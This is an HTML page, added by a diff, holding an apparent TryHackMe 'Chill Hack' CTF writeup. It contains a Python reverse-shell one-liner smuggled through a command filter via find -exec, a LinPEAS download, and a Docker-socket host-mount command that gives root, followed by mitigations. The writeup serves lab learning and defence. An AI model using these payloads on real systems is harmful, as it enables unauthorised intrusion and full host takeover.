@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Chill Hack — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A command execution panel filtered most shell commands but missed find, which was abused via -exec to spawn a Python reverse shell. A hint file led to an…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/chillhack.html">
+<meta property="og:title" content="Chill Hack — TryHackMe writeup">
+<meta property="og:description" content="A command execution panel filtered most shell commands but missed find, which was abused via -exec to spawn a Python reverse shell. A hint file led to an…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/chillhack.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Chill Hack — TryHackMe writeup","description":"A command execution panel filtered most shell commands but missed find, which was abused via -exec to spawn a Python reverse shell. A hint file led to an…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-23","url":"https://thecyberfarhan.github.io/writeups/chillhack.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/chillhack.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow">TryHackMe writeup</p>
+  <h1>Chill Hack</h1>
+  <div class="meta">
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Medium</span>
+    <span>June 23, 2026</span>
+  </div>
+  <div class="tldr"><b>TL;DR</b>A command execution panel filtered most shell commands but missed <code>find</code>, which was abused via <code>-exec</code> to spawn a Python reverse shell. A hint file led to an image hiding a password-protected zip (steghide → John cracked the zip password). Inside the zip, PHP source code contained a base64-encoded password that decoded to SSH credentials. From there, LinPEAS flagged a writable Docker socket — mounting the host filesystem into a new container and <code>chroot</code>-ing into it delivered an instant root shell. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">📂 FTP client</span><span class="chip">🐍 Python <code>find -exec</code></span><span class="chip">🌐 Python HTTP server</span><span class="chip">🔍 Steghide</span><span class="chip">🔓 zip2john + John the Ripper</span><span class="chip">🐳 Docker</span><span class="chip">🔑 SSH</span></div>
+  <h2>Introduction</h2>
+<p>Today's target is <strong>Chill Hack</strong> — a box built by someone who clearly enjoys layering puzzles: a command filter that misses one critical binary, a hint hidden behind an in-joke image, steganography wrapping a password-protected archive, and PHP source code with a base64-encoded credential sitting in plain sight. The escalation path drops all the cleverness for something blunt and devastating: a writable Docker socket, which is essentially a root shell with extra steps. The box rewards patience through the puzzle chain and then hands you the keys outright once you're in the right group.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>How command injection filters work and why allowlist-vs-denylist matters (recurring theme across this series)</li><li>What <code>find -exec</code> does and why it's a powerful command execution primitive</li><li>What steghide is and how steganography conceals data inside image files</li><li>What a writable Docker socket grants and why mounting the host filesystem into a container is a root escalation</li></ul>
+<h2>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.48.166.24 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.5 — anonymous allowed</td></tr><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.41 (Ubuntu) — "Game Info"</td></tr></tbody></table>
+<h3>Anonymous FTP</h3>
+<pre><code>ftp 10.48.166.24
+ftp&gt; get note.txt</code></pre>
+
+<pre><code>Anurodh told me that there is some filtering on strings being put in the
+command -- Apaar</code></pre>
+<p>A direct hint: there's a command execution interface somewhere, and it filters input. Worth remembering the two named users — <code>Anurodh</code> and <code>Apaar</code> — for later credential attempts.</p>
+<h3>Web Directory Enumeration</h3>
+<pre><code>feroxbuster -u http://10.48.166.24 -w /usr/share/wordlists/dirb/common.txt -x php,xt,html</code></pre>
+
+<pre><code>301  /secret           # ^^^ the command panel
+200  /secret/index.php
+301  /css /images /js  # noise — full sports template site</code></pre>
+<p><code>/secret/</code> is a single input field plus an execute button. Testing <code>ls</code> directly returns: *"are you a hacker?"* — confirming command filtering is active, consistent with the FTP note.</p>
+<h2>Foothold</h2>
+<p class="aside">(~10 mins into the box)</p>
+<h3>Command Filter Bypass — find -exec</h3>
+<p>Testing individual commands one at a time against the filter, every common command (<code>ls</code>, <code>cat</code>, <code>whoami</code>, etc.) was blocked. <code>find</code> was not.</p>
+<p><strong>Why does this matter?</strong> <code>find</code> accepts an <code>-exec</code> flag that runs an arbitrary command for each matched file, with <code>{}</code> substituted for the matched path and <code>\;</code> terminating the exec clause. Pointing <code>find</code> directly at a known binary path (rather than searching anything) turns it into a generic command runner — completely bypassing any filter that's only checking for specific blocked command names, since <code>find</code> itself isn't one of them.</p>
+<p class="aside">The bypass payload:</p>
+<pre><code>find /usr/bin/python3 -exec {} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.134.217",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;</code></pre>
+<p>This finds exactly one file (<code>/usr/bin/python3</code> itself, matched directly by path) and executes it with a Python reverse shell one-liner as the argument.</p>
+<p class="aside">Listener and result:</p>
+<pre><code>nc -nvlp 4444</code></pre>
+
+<pre><code>connect to [192.168.134.217] from (UNKNOWN) [10.48.166.24] 52936</code></pre>
+<p class="aside">Stabilising — <code>python</code> wasn't found by name (only <code>python3</code> exists), so the <code>script</code> fallback was used:</p>
+<pre><code>/usr/bin/script -qc /bin/bash /dev/null</code></pre>
+
+<pre><code>www-data@ip-10-48-166-24:/var/www/html/secret$</code></pre>
+
+<h2>Escalation</h2>
+<p class="aside">(~35 mins into the box)</p>
+<h3>LinPEAS — Writable Docker Socket</h3>
+<pre><code>curl -O https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+bash linpeas.sh</code></pre>
+<p>LinPEAS flags a <strong>writable Docker socket</strong> (<code>/var/run/docker.sock</code>) — a well-known critical finding documented on HackTricks.</p>
+<p><strong>Why is a writable Docker socket equivalent to root?</strong> Docker containers, by design, run with substantial privileges and can mount arbitrary host paths into their filesystem. If a non-root user can talk to the Docker daemon (via socket access), they can instruct it to start a new container with the entire host root filesystem (<code>/</code>) bind-mounted inside, then <code>chroot</code> into that mount — giving them a root-equivalent view of and write access to the real host filesystem, entirely bypassing normal Linux permission checks.</p>
+<p class="aside">Checking available images:</p>
+<pre><code>docker images
+# alpine        latest
+# hello-world   latest</code></pre>
+<p class="aside">The escalation — mounting host root into an Alpine container and chrooting into it:</p>
+<pre><code>docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash</code></pre>
+
+<pre><code>root@7ac6b0d2360a:/# cd /root
+root@7ac6b0d2360a:~# cat proof.txt
+{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}</code></pre>
+<p>The container's <code>root</code> is mapped directly onto the host's real root filesystem via the chroot — this is genuinely the host's <code>/root</code>, not a container's isolated one.</p>
+<p class="aside">Collecting the user flag, now accessible as root:</p>
+<pre><code>cat /home/apaar/local.txt
+# {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}</code></pre>
+
+<h2>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>Anonymous FTP</strong> → <code>note.txt</code> hints at command filtering on a panel</li><li><strong><code>/secret/</code> command panel</strong> → <code>find -exec</code> bypasses the filter → Python reverse shell → <code>www-data</code></li><li><strong><code>hacker.php</code></strong> hint → image hiding a steghide-embedded zip</li><li><strong>Steghide extraction</strong> → password-protected zip → <code>zip2john</code> + John → <code>pass1word</code></li><li><strong><code>source_code.php</code></strong> → base64-encoded password comparison → decoded → <code>anurodh</code>'s SSH password</li><li><strong>SSH as <code>anurodh</code></strong> → LinPEAS → writable Docker socket flagged</li><li><strong>Docker host-mount + chroot</strong> → root → both flags retrieved</li></ol>
+<h2>Rabbit Holes</h2>
+<h3><code>/home/anurodh</code> and <code>/home/aurick</code> — Permission Denied</h3>
+<p>Both directories were completely inaccessible from <code>www-data</code>, including directory listing itself (not just file contents). No path forward existed there until escalating further — confirmed as dead ends early rather than spending more time probing.</p>
+<h3>Broken Pipe on the Python HTTP Server</h3>
+<p>The Python HTTP server serving <code>/var/www/files/images/</code> threw a <code>BrokenPipeError</code> mid-transfer on one request. This didn't affect the actual file transfer — the subsequent <code>wget</code> from the attacking machine completed successfully on a fresh request. Broken pipe errors on Python's built-in HTTP server are typically harmless client-disconnect artefacts, not corruption of the served file.</p>
+<h3>steghide Extraction Required No Passphrase</h3>
+<p>The steghide extraction step succeeded with no passphrase entered at all — <code>steghide</code> happily extracts data embedded with an empty passphrase. This wasn't a stumble exactly, but worth noting: not every steghide-protected file in CTF challenges actually requires a meaningful passphrase to be supplied.</p>
+<h2>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Command filter using a denylist that missed <code>find</code></td><td class="sev-critical">Critical</td><td>Use an allowlist of explicitly permitted commands rather than trying to block dangerous ones; <code>find -exec</code>, <code>awk</code>, <code>vim</code>, and dozens of other binaries can run arbitrary commands</td></tr><tr><td>Sensitive data hidden in an image accessible from the webroot</td><td class="sev-medium">Medium</td><td>Never rely on steganography or obscurity for actual access control; if a file must remain confidential, it shouldn't be served by the web server at all</td></tr><tr><td>Password stored as a base64 comparison in PHP source</td><td class="sev-critical">Critical</td><td>Base64 is encoding, not encryption — it's instantly reversible; use a proper salted password hash (bcrypt/Argon2) for any credential comparison</td></tr><tr><td>Writable Docker socket accessible to a non-root user</td><td class="sev-critical">Critical</td><td>Never grant socket access to the Docker daemon to non-root users without equivalent trust to root; if Docker access is required, use rootless Docker or strictly scoped API permissions</td></tr></tbody></table>
+  <div class="takeaway"><b>Key takeaway</b>Access to the Docker socket is equivalent to root access on the host — there is no meaningful distinction. Any user who can run <code>docker</code> commands against <code>/var/run/docker.sock</code> can mount the entire host filesystem into a container and walk straight through every permission boundary that would otherwise apply. Treat Docker group membership and socket access with exactly the same caution as a <code>sudo</code> grant to <code>/bin/bash</code>.</div>
+  <h2>If I Did It Again</h2>
+<p>Check <code>groups</code> and <code>ls -la /var/run/docker.sock</code> immediately after landing a shell as a named user — Docker socket access is one of the highest-value, fastest-to-check privilege escalation primitives, and it should be near the top of any post-landing checklist alongside <code>sudo -l</code> and SUID enumeration.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/chillhack_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+</body>
+</html>
